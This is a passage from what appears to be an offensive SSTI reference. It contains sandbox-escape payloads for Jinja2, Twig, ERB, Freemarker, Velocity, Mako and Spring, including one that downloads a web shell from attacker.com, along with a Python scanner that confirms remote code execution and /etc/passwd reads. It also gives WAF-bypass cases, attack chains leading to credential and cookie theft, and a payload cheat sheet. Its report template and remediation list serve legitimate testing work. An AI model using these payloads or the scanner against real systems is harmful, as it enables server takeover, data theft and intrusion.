{{config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('id', shell=True)}}

# Method 6: cycler/global tricks
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

### PHP Sandbox Escape (Twig context)
```php
// Method 1: filter chain
{{["id"]|filter("system")}}
{{["cat /etc/passwd"]|filter("system")}}
{{["wget http://attacker.com/shell.php -O /var/www/html/shell.php"]|filter("system")}}

// Method 2: callback manipulation
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Method 3: object manipulation
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### Ruby Sandbox Escape (ERB context)
```ruby
# Method 1: Direct system call
<%= system("id") %>
<%= `id` %>

# Method 2: Kernel methods
<%= Kernel.system("id") %>
<%= Kernel.`id` %>

# Method 3: IO manipulation
<%= IO.popen("id").readlines %>
<%= IO.popen(["id"]).readlines %>

# Method 4: File operations
<%= IO.read("/etc/passwd") %>
<%= File.read("/etc/passwd") %>
```

### Java Sandbox Escape (Freemarker context)
```ftl
<#-- Method 1: Runtime.exec -->
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<#-- Method 2: ProcessBuilder -->
<#assign pb=object.class.forName("java.lang.ProcessBuilder")>
<#assign process=pb.newInstance(["bash","-c","id"])>
<#assign started=process.start()>

<#-- Method 3: ClassLoader manipulation -->
<#assign cl=object.class.protectionDomain.classLoader>
<#assign evil=cl.loadClass("com.example.Evil")>
<#assign instance=evil.newInstance()>

<#-- Method 4: Reflection -->
<#assign rt=object.class.forName("java.lang.Runtime")>
<#assign method=rt.getMethod("exec", object.class.forName("java.lang.String"))>
<#assign result=method.invoke(rt.getMethod("getRuntime").invoke(""), "id")>
```

---

## Automated SSTI Detection Script
```python
#!/usr/bin/env python3
"""Comprehensive SSTI detection and exploitation"""

import requests
import sys
from urllib.parse import urljoin

class SSTIScanner:
    def __init__(self, url: str, params: dict = None, headers: dict = None):
        self.url = url
        self.params = params or {}
        self.headers = headers or {}
        self.session = requests.Session()
        self.engines = {
            'jinja2': {
                'detect': '{{7*7}}',
                'indicator': '49',
                'rce': "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                'file_read': "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
            },
            'twig': {
                'detect': '{{7*7}}',
                'indicator': '49',
                'rce': '{{["id"]|filter("system")}}',
                'file_read': '{{["cat /etc/passwd"]|filter("system")}}',
            },
            'freemarker': {
                'detect': '${7*7}',
                'indicator': '49',
                'rce': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                'file_read': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}',
            },
            'erb': {
                'detect': '<%= 7*7 %>',
                'indicator': '49',
                'rce': '<%= system("id") %>',
                'file_read': '<%= IO.read("/etc/passwd") %>',
            },
            'velocity': {
                'detect': '#set($x=7*7)$x',
                'indicator': '49',
                'rce': '#set($x="id")#set($rt=$class.forName("java.lang.Runtime"))#set($process=$rt.getRuntime().exec($x))$process.waitFor()',
                'file_read': '#set($x="cat /etc/passwd")#set($rt=$class.forName("java.lang.Runtime"))#set($process=$rt.getRuntime().exec($x))',
            },
            'mako': {
                'detect': '${7*7}',
                'indicator': '49',
                'rce': '<%import os%>${os.popen("id").read()}',
                'file_read': '<%import os%>${os.popen("cat /etc/passwd").read()}',
            },
        }

    def detect_engine(self):
        """Detect template engine"""
        for engine, payloads in self.engines.items():
            try:
                resp = self.session.get(
                    self.url,
                    params={**self.params, 'input': payloads['detect']},
                    headers=self.headers,
                    timeout=10
                )
                if payloads['indicator'] in resp.text:
                    print(f"[+] Detected: {engine}")
                    return engine
            except Exception:
                pass
        print("[-] No SSTI detected")
        return None

    def test_rce(self, engine: str):
        """Test for RCE"""
        payloads = self.engines.get(engine, {})
        if not payloads:
            return False

        try:
            resp = self.session.get(
                self.url,
                params={**self.params, 'input': payloads['rce']},
                headers=self.headers,
                timeout=10
            )
            if 'uid=' in resp.text or 'root:' in resp.text:
                print(f"[+] RCE confirmed: {engine}")
                return True
        except Exception:
            pass
        return False

    def test_file_read(self, engine: str):
        """Test for file read"""
        payloads = self.engines.get(engine, {})
        if not payloads:
            return False

        try:
            resp = self.session.get(
                self.url,
                params={**self.params, 'input': payloads['file_read']},
                headers=self.headers,
                timeout=10
            )
            if 'root:' in resp.text or 'www-data' in resp.text:
                print(f"[+] File read confirmed: {engine}")
                return True
        except Exception:
            pass
        return False

    def run_all(self):
        """Run all SSTI tests"""
        print(f"[*] Testing SSTI on: {self.url}")
        engine = self.detect_engine()
        if engine:
            self.test_rce(engine)
            self.test_file_read(engine)
        return engine

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    scanner = SSTIScanner(sys.argv[1])
    scanner.run_all()
```

---

## Real-World SSTI Bypass Cases

### Case 7: Filter Bypass in Production Flask App
**Target**: E-commerce platform with product search
**Payload**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
**Block**: WAF blocked `__class__` keyword
**Bypass**: `{{config[chr(95)+'_cla'+chr(115)+'s'+chr(95)+'_']...}}`
**Result**: RCE achieved via string concatenation

### Case 8: Sandboxed Jinja2 with Restricted builtins
**Target**: Template engine with restricted `__builtins__`
**Payload**: `{{''.__class__.__mro__[2].__subclasses__()}}`
**Block**: Builtins filtered, but subclasses accessible
**Bypass**: Used `os._wrap_close` class (index 132)
**Result**: RCE via `__init__.__globals__['popen']('id')`

### Case 9: Django Template SSTI Bypass
**Target**: Django application with custom template filters
**Payload**: `{{7*7}}` worked, but `config` blocked
**Block**: `config` keyword filtered
**Bypass**: Used `request.environ` or `settings` instead
**Result**: Full server configuration disclosure

### Case 10: Freemarker Sandbox Escape
**Target**: Java application with Freemarker templates
**Payload**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
**Block**: `Execute` class restricted
**Bypass**: Used `JythonRuntime` or `ObjectConstructor` instead
**Result**: RCE via alternative utility class

### Case 11: Twig RCE in CMS Platform
**Target**: Custom CMS using Twig
**Payload**: `{{["id"]|filter("system")}}`
**Block**: `filter` function disabled
**Bypass**: Used `map` function: `{{["id"]|map("system")|join}}`
**Result**: RCE achieved via alternative filter

### Case 12: Velocity Template Injection
**Target**: Java web application using Velocity
**Payload**: `#set($x="id")#set($rt=$class.forName("java.lang.Runtime"))#set($process=$rt.getRuntime().exec($x))`
**Block**: `Runtime` class filtered
**Bypass**: Used `ProcessBuilder` instead
**Result**: RCE via alternative execution method

---

## Performance Optimization for SSTI Scanning

### Parallel Testing
```python
import asyncio
import aiohttp

async def test_ssti_async(url, payloads, engine):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for payload in payloads:
            task = asyncio.create_task(
                test_payload(session, url, payload, engine)
            )
            tasks.append(task)
        results = await asyncio.gather(*tasks)
        return results

async def test_payload(session, url, payload, engine):
    try:
        async with session.get(url, params={'input': payload}, timeout=10) as resp:
            text = await resp.text()
            if engine['indicator'] in text:
                return {'engine': engine['name'], 'payload': payload, 'vuln': True}
    except Exception:
        pass
    return {'engine': engine['name'], 'payload': payload, 'vuln': False}
```

### Caching Engine Detection
```python
import functools

@functools.lru_cache(maxsize=128)
def detect_engine_cached(url, payload_hash):
    return detect_engine(url)

def clear_cache():
    detect_engine_cached.cache_clear()
```

### Rate Limiting
```python
import time
from threading import Lock

class RateLimiter:
    def __init__(self, max_per_second: int = 10):
        self.max_per_second = max_per_second
        self.current = 0
        self.lock = Lock()
        self.last_reset = time.time()

    def wait(self):
        with self.lock:
            now = time.time()
            if now - self.last_reset > 1.0:
                self.current = 0
                self.last_reset = now
            if self.current >= self.max_per_second:
                time.sleep(1.0 - (now - self.last_reset))
                self.current = 0
            self.current += 1
```

---

## Integration with Other Vulnerabilities

### SSTI + XSS Chain
```
1. Detect SSTI endpoint
2. Test for template rendering
3. Inject XSS payload via template syntax
4. Achieve stored XSS via template
5. Steal user cookies
6. Escalate to account takeover
```

### SSTI + SSRF Chain
```
1. Detect SSTI endpoint
2. Test for RCE capability
3. Use RCE to read internal config
4. Extract internal IP addresses
5. Pivot to internal services via SSRF
6. Access cloud metadata endpoints
7. Extract IAM credentials
```

### SSTI + SQLi Chain
```
1. Detect SSTI endpoint
2. Test for file read capability
3. Read database config files
4. Extract database credentials
5. Connect to database directly
6. Extract sensitive data
7. Achieve full database compromise
```

### SSTI + XXE Chain
```
1. Detect SSTI in XML processing
2. Test for template injection in XML
3. Inject XXE payload via SSTI
4. Read files via XXE
5. SSRF via XXE to internal services
6. Full server compromise
```

---

## Reporting Templates

### SSTI Finding Report
```
## Server-Side Template Injection (SSTI)

### Vulnerability Summary
[URL] is vulnerable to SSTI via the [parameter] parameter.
The [template engine] engine allows injection of template syntax,
resulting in [impact].

### Affected Endpoint
[METHOD] [URL]
Parameter: [name]
Value: [payload]

### Proof of Concept
1. Send request with payload: [payload]
2. Observe response: [evidence]
3. Confirm RCE: [command output]

### Impact
- Remote code execution on server
- File system access (read/write)
- Database access
- Lateral movement to internal network
- Full server compromise

### Affected Engine
Engine: [jinja2/twig/freemarker/erb/spring/velocity]
Version: [if known]
Sandbox: [yes/no, bypassed?]

### Remediation
1. Use sandboxed template engine
2. Validate and sanitize user input
3. Implement template auto-escaping
4. Restrict available template features
5. Use Web Application Firewall (WAF)
6. Regular security testing
```

### SSTI Risk Matrix
| Severity | Condition | CVSS |
|----------|-----------|------|
| Critical | RCE + file read | 9.8 |
| High | RCE only | 9.0 |
| High | File read + SSRF | 8.5 |
| Medium | File read only | 7.5 |
| Medium | Information disclosure | 6.5 |
| Low | Limited output | 4.0 |

---

## Quick Reference Cheat Sheet

### Jinja2 Payloads
```
{{7*7}}                                          # Detection
{{config}}                                       # Config read
{{''.__class__.__mro__[2].__subclasses__()}}     # Class list
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}  # RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}  # Alt RCE
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}  # Via builtins
```

### Twig Payloads
```
{{7*7}}                                          # Detection
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}  # RCE
{{["id"]|filter("system")}}                      # Alt RCE
{{["cat /etc/passwd"]|filter("system")}}         # File read
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}  # Alt RCE 2
```

### Freemarker Payloads
```
${7*7}                                           # Detection
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}  # RCE
<#assign ex="freemarker.template.utility.JythonRuntime"?new()><@ex>import os;os.system('id')</@ex>  # Alt RCE
```

### ERB Payloads
```
<%= 7*7 %>                                       # Detection
<%= system("id") %>                               # RCE
<%= `id` %>                                       # Alt RCE
<%= IO.read("/etc/passwd") %>                     # File read
<%= IO.popen("id").readlines %>                   # Alt RCE 2
```

### Spring Payloads
```
${7*7}                                           # Detection
#{T(java.lang.Runtime).getRuntime().exec('id')}  # RCE
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}  # Alt RCE
#{T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd'))}  # File read
```

---

## Resources and References
- PortSwigger SSTI labs: https://portswigger.net/web-security/server-side-template-injection
- TInjA tool: https://github.com/epinna/tplmap
- SSTI cheat sheet: https://github.com/tennc/cheatsheets/blob/master/web/server-side-template-injection.md
- OWASP SSTI: https://owasp.org/www-community-server-side-template-injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
